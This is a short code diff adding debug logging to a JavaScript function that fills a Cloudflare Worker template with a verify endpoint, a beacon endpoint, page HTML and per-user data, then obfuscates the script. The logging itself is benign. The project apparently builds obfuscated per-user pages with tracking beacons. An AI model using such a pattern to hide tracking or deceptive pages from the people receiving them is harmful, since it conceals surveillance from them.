@@ -79,6 +79,9 @@ function buildWorkerScript(link, user) {
 
   // Inject user data as a sanitized JSON string
   const safeUserJson = JSON.stringify(safeUser);
+  console.log('[TemplateLoader] Before replacement - VERIFY_ENDPOINT:', workerScript.includes("'{{VERIFY_ENDPOINT}}'"));
+  console.log('[TemplateLoader] Before replacement - BEACON_ENDPOINT:', workerScript.includes("'{{BEACON_ENDPOINT}}'"));
+  console.log('[TemplateLoader] Server URL:', serverUrl);
 
   workerScript = workerScript
     .replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
@@ -88,8 +91,10 @@ function buildWorkerScript(link, user) {
     .replace("'{{TEMPLATE_HTML}}'", JSON.stringify(templateHTML))
     .replace("'{{USER_DATA}}'", safeUserJson);
 
-  console.log('[TemplateLoader] After replacement - has placeholder:', workerScript.includes('{{TEMPLATE_HTML}}'));
-  console.log('[TemplateLoader] templateHTML first 100 chars:', templateHTML ? templateHTML.substring(0, 100) : 'EMPTY');
+
+  console.log('[TemplateLoader] After replacement - BEACON_ENDPOINT still exists:', workerScript.includes("'{{BEACON_ENDPOINT}}'"));
+  console.log('[TemplateLoader] After replacement - TEMPLATE_HTML still exists:', workerScript.includes('{{TEMPLATE_HTML}}'));
+
 
   // Obfuscate if enabled - WORKER-SAFE approach
   // We use a custom, lightweight obfuscation that's safe for Cloudflare Workers
